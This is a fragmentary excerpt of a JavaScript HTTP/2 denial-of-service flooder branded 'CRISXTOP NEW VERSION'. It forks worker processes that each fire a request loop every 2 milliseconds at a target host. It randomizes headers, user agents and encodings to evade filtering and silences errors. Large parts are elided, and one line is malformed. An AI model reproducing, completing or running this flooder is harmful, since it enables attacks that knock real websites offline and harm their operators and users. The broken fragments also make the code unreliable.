...
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";"GREASE:X25519:x25519";
 ...
 if (cluster.isMaster) {
    ...
    console.clear()
console.log('CRISXTOP NEW VERSION'.rainbow);
console.log('--------------------------------------------');
...
} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 2) }}
...
function getRandomUserAgent() {
 ...
 function runFlooder() {
    ...
    let headers = {
        ...
        ":scheme": "https",
        "sec-ch-ua-full-version-list" : getRandomUserAgent(),
        "accept-encoding": Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)],
        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
 ...
 process.on('unhandledRejection', error => {});
  const client = http2.connect(`https://${parsedTarget.host}/${parsedTarget.path}`, {
